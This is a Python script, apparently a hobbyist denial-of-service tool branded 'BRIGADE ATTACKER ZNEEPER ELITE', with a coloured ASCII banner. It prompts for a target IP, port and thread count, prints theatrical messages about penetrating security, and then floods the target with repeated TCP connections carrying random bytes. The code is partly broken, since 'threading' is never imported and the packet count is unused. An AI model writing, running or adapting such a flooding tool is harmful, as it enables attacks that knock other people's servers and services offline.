#!/usr/bin/python
# _*_ coding: utf-8 _*_
import sys
import os
import socket
import random
import string
import time
import requests
import progressbar

# importing time module
import time
t = 2 # 2 seconds
time.sleep(t)
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ZA1 = '\033[31m'
    ZA2 = '\033[32m'
    ZA3 = '\033[33m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ZH = '\033[97m'

# CLEAR
os.system("clear")
print("")
print("\033[33m         @ @ @     @ @ @ @ @   @ @ @ @        @ @ @      @ @ @ @       \033[0m")
print("\033[33m      @        @          @    @       @    @        @   @       @     \033[0m")
print("\033[33m     @          @        @     @        @  @          @  @        @    \033[0m")
print("\033[96m     @          @       @      @        @  @          @  @        @    \033[0m")
print("\033[96m     @          @      @       @       @   @          @  @       @     \033[0m")
print("\033[31m     @          @     @        @ @ @ @     @          @  @ @ @ @       \033[0m")
print("\033[31m      @        @     @         @            @        @   @      @      \033[0m")
print("\033[31m         @ @ @      @ @ @ @ @  @               @ @ @     @        @    \033[0m")
print(" ")
print("\033[96m                                                 @ @ @        @      \033[0m")
print("\033[96m                                               @       @     @       \033[0m")
print("\033[96m                                                      @     @     @  \033[0m")
print("\033[92m                                                    @      @      @  \033[0m")
print("\033[92m                                                  @       @ @ @ @ @  \033[0m")
print("\033[92m                                                @ @ @ @ @         @  \033[0m")
print(" ")
print("\033[96m≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠\033[0m")
print("\033[1m   B R I G A D E   A T T A C K E R   Z N E E P E R   E L I T E            \033[0m")
print("\033[1m                        design by: Za'99                                  \033[0m")
print("\033[1m                            ———0———                                          \033[0m")
print("\033[96m≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠\033[0m")
ip = str(input("\033[93m[\033[93m+\033[92m]IP Target : "))
print("\033[33m⁸⁹⁰⁰⁰⁰⁸")
port = int(input("\033[92m[\033[95m+\033[92m]Port : "))
print("\033[32m⁸⁹⁰⁰⁰⁰⁸")
packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
print("\033[31m⁸⁹⁰⁰⁰⁰⁸")
thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
print("\033[94m⁸⁹⁰⁰⁰⁰⁸")
print("\033[92m........>>> BIRUH BIDDAM NAFDIKA YAA AQSHA 033[0m "),
print("\033[92m........>>> SIYAP-SIYAP GOLEK SERVER \033[0m "),
time.sleep(2),
print("\033[92m........>>> MIWITI GOLEK SAMBUNGAN \033[0m "),
time.sleep(2),
print("\033[92m........>>> NEMBUS LAPISAN KEAMANAN \033[0m "),
time.sleep(2),
print("\033[92m.........>>> DIGAWE SAMBUNGAN \033[0m "),
time.sleep(2),


def animated_marker():
    widgets = ['\033[33m[\033[31m#\033[31\033[33m#\033[31mLoading: progressbar.AnimatedBouncer()\033[0m']
    pbar = progressbar.ProgressBar(widgets=widgets).start()
    for i in range(180):
        time.sleep(2)
        pbar.update(i)


animated_marker()

def start():
   r = random._urandom(10)
   u = int(0)
   while True:
       try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip,port))
         s.send(r)
         u += 1
         print("\033[92m[\033[97m+\033[92m]\033[92m0ps BADAI GURUN " +str(u)+ " \033[93mZNEEPER B453 " +str()+ " \033[1m" +ip+ "\033[0m" )
       finally:
         s.close()
         print("\033[97m[\033[91m-\033[97m]\033[91mFlooding Done!")

for x in range(thread):
  thred = threading.Thread(target=start)
  thred.start()
